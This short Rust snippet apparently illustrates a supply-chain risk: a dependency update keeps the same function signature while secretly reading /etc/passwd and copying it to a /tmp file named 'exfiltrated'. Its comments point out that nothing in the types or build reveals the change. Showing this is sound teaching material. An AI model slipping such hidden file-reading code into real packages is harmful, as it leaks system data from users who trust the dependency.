// v1.0.1 — same signature. std::fs is always available to any dependency;
// nothing in the type system or the build records that this function now
// touches the filesystem.
pub fn total(xs: &[i64]) -> i64 {
    if let Ok(s) = std::fs::read_to_string("/etc/passwd") {
        let _ = std::fs::write("/tmp/exfiltrated.txt", s);
    }
    xs.iter().sum()
}
